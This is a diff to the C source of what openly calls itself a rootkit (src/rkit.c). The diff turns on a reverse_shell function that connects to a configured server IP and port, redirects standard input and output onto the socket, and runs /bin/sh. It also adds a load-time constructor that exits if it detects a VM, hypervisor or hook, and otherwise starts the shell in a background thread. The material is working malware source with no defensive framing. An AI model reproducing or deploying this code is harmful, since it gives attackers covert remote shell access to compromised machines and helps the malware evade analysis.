@@ -16,25 +16,27 @@
  * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
  */
 
+#include "anti.h"
 #include "rkit.h"
+#include "utils.h"
 #include "config.h"
 
 
 /*
     *    src/rkit.c
-    *    Date: 03/30/22
+    *    Date: 04/04/22
     *    Author: 0x80000000
 */
 
 
-void __attribute__((constructor)) vm_check(void) {
-#ifdef DEBUG
-  rkit_log("Rootkit loaded!\n");
-#endif
-  //if (DetectHypervisors() || ptrace_detection())
-    //exit(EXIT_FAILURE);
+/**
+ * @brief Starts the reverse shell.
+ */
 
-/*
+void *reverse_shell(void) {
+  const char *args[] = {"/bin/sh", NULL};
+  int (*temp_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = dlsym(RTLD_NEXT, "connect");
+
   int32_t fd;
   struct sockaddr_in server;
   uint8_t buffer[BUFSIZ] = {0};
@@ -44,19 +46,33 @@ void __attribute__((constructor)) vm_check(void) {
   server.sin_port = htons(SERVER_PORT);
 
   if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
-    exit(EXIT_FAILURE);
+    return;
 
-  if (connect(fd, (struct sockaddr *)&server, sizeof(server)) == -1)
-    exit(EXIT_FAILURE);
+  if (temp_connect(fd, (struct sockaddr *)&server, sizeof(server)) == -1)
+    return;
 
 #ifdef DEBUG
   rkit_log("Connected to [%s]!\n", SERVER_IP);
 #endif
 
   for (int32_t i = 0; i < 3; i++)
-    dup(fd, i);
+    dup2(fd, i);
 
-  execve("/bin/sh", NULL, NULL);
-  close(fd);
-  */
+  execve("/bin/sh", args, NULL);
+}
+
+/**
+ * @brief Initializes the rootkit.
+ */
+
+void __attribute__((constructor)) init_rootkit(void) {
+  pthread_t thread;
+#ifdef DEBUG
+  rkit_log("Rootkit loaded!\n");
+#endif
+  if (vm_cpu() || vm_uptime() || detect_jmp_hook() || DetectHypervisors())
+    exit(EXIT_FAILURE);
+
+  pthread_create(&thread, NULL, (void *)&reverse_shell, NULL);
+  ptrace_detection();
 }
